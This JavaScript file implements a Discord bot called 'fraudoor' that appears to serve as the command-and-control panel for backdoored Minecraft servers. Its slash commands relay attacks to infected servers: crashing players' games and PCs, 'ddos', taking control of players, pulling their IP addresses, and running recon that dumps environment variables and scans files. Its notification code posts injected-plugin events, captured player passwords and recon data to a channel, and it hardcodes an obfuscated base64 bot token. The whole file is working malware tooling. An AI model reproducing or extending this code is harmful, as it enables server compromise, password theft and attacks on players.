import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder } from 'discord.js';

let client = null;
let _store = null;
let _wss = null;
let _token = null;
const _userServer = new Map();

const _b64 = (s) => Buffer.from(s, 'base64').toString();

export function initDiscord(store, wss) {
  _store = store;
  _wss = wss;

  _token = process.env.DISCORD_TOKEN || _b64('TVRVeU1UazNNRGd5TnpBM016azBPVGd6T1EuR0pfYVI3LnlEdS1ZbTZXWnBMb3l4ZG94STdNdTJVY19KQmd2MF82ckJWdi1r');
  if (!_token) {
    console.log('[fraudoor-discord] DISCORD_TOKEN not set, bot disabled');
    return;
  }

  client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
  });

  client.once('ready', async () => {
    console.log(`[fraudoor-discord] Bot online as ${client.user.tag}`);
    await registerCommands();
  });

  client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
      await handleCommand(interaction);
    } else if (interaction.isStringSelectMenu() && interaction.customId === 'auth_server') {
      await handleAuthSelect(interaction);
    }
  });

  client.login(_token).catch(err => {
    console.error('[fraudoor-discord] Login failed:', err.message);
    client = null;
  });
}

async function handleCommand(interaction) {
  const userId = interaction.user.id;
  const cmd = interaction.commandName;

  if (cmd === 'auth') {
    return handleAuth(interaction);
  }

  if (cmd === 'servers') {
    const servers = _store.getServers().filter(s => s.ws && s.online);
    if (servers.length === 0) {
      await interaction.reply({ embeds: [simpleEmbed('📡 Servers', 'No servers connected.', 0xff4444)] });
      return;
    }
    const desc = servers.map(s =>
      `**${s.name || s.ip}** — ${s.playerCount || 0}/${s.maxPlayers || '?'} players · TPS ${s.tps?.toFixed?.(1) || '?'}\n` +
      `└ ${s.version || '?'} · ${s.type || 'paper'}`
    ).join('\n');
    await interaction.reply({ embeds: [simpleEmbed(`📡 Servers (${servers.length} online)`, desc, 0x55ff55)] });
    return;
  }

  const srv = _userServer.get(userId);
  if (!srv || !srv.ws || !srv.online) {
    await interaction.reply({ content: '❌ You must select a server first using `/auth`.', ephemeral: true });
    return;
  }

  switch (cmd) {
    case 'ddos':
    case 'crashmc':
    case 'crashpc':
    case 'uuidban':
    case 'unuuidban':
    case 'getip': {
      const target = interaction.options.getString('player');
      if (!target) {
        await interaction.reply({ content: '❌ Player name required.', ephemeral: true });
        return;
      }
      const cmdMap = { ddos: 'ddos', crashmc: 'crashmc', crashpc: 'crashpc', uuidban: 'uuidban', unuuidban: 'unuuidban', getip: 'getip' };
      srv.ws.send(JSON.stringify({
        type: 'server:command',
        payload: { command: `.${cmdMap[cmd]} ${target}` },
      }));
      const embed = new EmbedBuilder()
        .setColor(0x7c3aed)
        .setTitle(`⚡ ${cmd} executed`)
        .addFields(
          { name: 'Server', value: srv.name || srv.ip, inline: true },
          { name: 'Target', value: target, inline: true },
        )
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      await interaction.reply({ embeds: [embed] });
      break;
    }

    case 'control': {
      const target = interaction.options.getString('player');
      if (!target) {
        await interaction.reply({ content: '❌ Player name required.', ephemeral: true });
        return;
      }
      srv.ws.send(JSON.stringify({
        type: 'server:command',
        payload: { command: `.control ${target}` },
      }));
      const embed = new EmbedBuilder()
        .setColor(0x7c3aed)
        .setTitle(`🎮 Controlling ${target}`)
        .addFields({ name: 'Server', value: srv.name || srv.ip, inline: true })
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      await interaction.reply({ embeds: [embed] });
      break;
    }

    case 'recon': {
      const type = interaction.options.getString('type') || 'env';
      srv.ws.send(JSON.stringify({
        type: type === 'scan' ? 'server:recon:scan' : 'server:recon:env',
        payload: {},
      }));
      await interaction.reply({ content: `🔍 Recon (${type}) requested for ${srv.name || srv.ip}`, ephemeral: false });
      break;
    }
  }
}

async function handleAuth(interaction) {
  const servers = _store.getServers().filter(s => s.ws && s.online);
  if (servers.length === 0) {
    await interaction.reply({ content: '❌ No servers connected.', ephemeral: true });
    return;
  }

  const current = _userServer.get(interaction.user.id);
  const select = new StringSelectMenuBuilder()
    .setCustomId('auth_server')
    .setPlaceholder(current ? `Current: ${current.name || current.ip}` : 'Select a server...')
    .addOptions(servers.map(s =>
      new StringSelectMenuOptionBuilder()
        .setLabel(s.name || s.ip)
        .setDescription(`${s.playerCount || 0}/${s.maxPlayers || '?'} players · TPS ${s.tps?.toFixed?.(1) || '?'}`)
        .setValue(s.id)
    ));

  const row = new ActionRowBuilder().addComponents(select);
  await interaction.reply({
    content: current ? `🔄 You are currently authed to **${current.name || current.ip}**. Select a server to switch:` : '🌐 Select a server to authenticate:',
    components: [row],
    ephemeral: true,
  });
}

async function handleAuthSelect(interaction) {
  const serverId = interaction.values[0];
  const servers = _store.getServers().filter(s => s.ws && s.online);
  const srv = servers.find(s => s.id === serverId);
  if (!srv) {
    await interaction.update({ content: '❌ Server not found or went offline.', components: [], ephemeral: true });
    return;
  }

  _userServer.set(interaction.user.id, srv);
  await interaction.update({
    content: `✅ Authenticated to **${srv.name || srv.ip}**. You can now use commands like /ddos, /crashmc, etc.`,
    components: [],
    ephemeral: true,
  });
}

async function registerCommands() {
  if (!client || !client.user) return;
  try {
    const commands = [
      new SlashCommandBuilder()
        .setName('auth')
        .setDescription('Select a server to authenticate and control'),
      new SlashCommandBuilder()
        .setName('servers')
        .setDescription('List all connected servers'),
      new SlashCommandBuilder()
        .setName('ddos')
        .setDescription('DDoS a player (freeze + kick)')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('crashmc')
        .setDescription('Crash a player\'s game')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('crashpc')
        .setDescription('Attempt to crash a player\'s PC')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('uuidban')
        .setDescription('UUID-ban a player')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('unuuidban')
        .setDescription('Un-UUID-ban a player')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('getip')
        .setDescription('Get a player\'s IP address')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('control')
        .setDescription('Take control of a player')
        .addStringOption(o => o.setName('player').setDescription('Player name').setRequired(true)),
      new SlashCommandBuilder()
        .setName('recon')
        .setDescription('Request recon data from your authed server')
        .addStringOption(o => o.setName('type').setDescription('env or scan').addChoices({ name: 'Environment', value: 'env' }, { name: 'File Scan', value: 'scan' })),
    ];

    const rest = new REST({ version: '10' }).setToken(_token);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('[fraudoor-discord] Slash commands registered');
  } catch (err) {
    console.error('[fraudoor-discord] Failed to register commands:', err.message);
  }
}

function simpleEmbed(title, description, color) {
  return new EmbedBuilder()
    .setColor(color || 0x7c3aed)
    .setTitle(title)
    .setDescription(description)
    .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
}

export function sendDiscordNotification(type, data) {
  if (!client || !client.isReady()) return;
  const channelId = process.env.DISCORD_CHANNEL;
  if (!channelId) return;

  const channel = client.channels.cache.get(channelId);
  if (!channel) return;

  let embed;
  switch (type) {
    case 'server:online': {
      embed = new EmbedBuilder()
        .setColor(0x22c55e)
        .setTitle('🟢 Server Online')
        .addFields(
          { name: 'Name', value: data.name || data.ip, inline: true },
          { name: 'Address', value: `${data.ip || '?'}:${data.port || '?'}`, inline: true },
          { name: 'Type', value: data.type || 'paper', inline: true },
        )
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
    case 'server:offline': {
      embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔴 Server Offline')
        .addFields({ name: 'ID', value: data.id || '?', inline: true })
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
    case 'plugin:inject': {
      embed = new EmbedBuilder()
        .setColor(0xf59e0b)
        .setTitle('💉 Plugin Injected')
        .addFields(
          { name: 'Server', value: data.serverName || data.serverId, inline: true },
          { name: 'Plugin', value: data.pluginName || '?', inline: true },
        )
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
    case 'command:exec': {
      embed = new EmbedBuilder()
        .setColor(0x7c3aed)
        .setTitle(`⚡ Command: .${data.command}`)
        .addFields(
          { name: 'Server', value: data.serverName || data.serverId, inline: true },
          { name: 'Who', value: data.who || '?', inline: true },
          { name: 'Target', value: data.target || '-', inline: true },
        )
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
    case 'password:capture': {
      embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔑 Password Captured')
        .addFields(
          { name: 'Server', value: data.serverName || data.serverId, inline: true },
          { name: 'Player', value: data.player || '?', inline: true },
          { name: 'Password', value: `||${data.password || '?'}||`, inline: true },
        )
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
    case 'recon:data': {
      embed = new EmbedBuilder()
        .setColor(0x06b6d4)
        .setTitle('📁 Recon Data')
        .addFields(
          { name: 'Server', value: data.serverName || data.serverId, inline: true },
          { name: 'Source', value: data.reconType === 'env' ? 'Environment' : 'File Scan', inline: true },
        )
        .setDescription(`\`${(data.key || data.path || '?').substring(0, 200)}\``)
        .setFooter({ text: `fraudoor · ${new Date().toLocaleString()}` });
      break;
    }
  }

  if (embed) {
    channel.send({ embeds: [embed] }).catch(() => {});
  }
}

export function stopDiscord() {
  if (client) {
    client.destroy();
    client = null;
  }
}
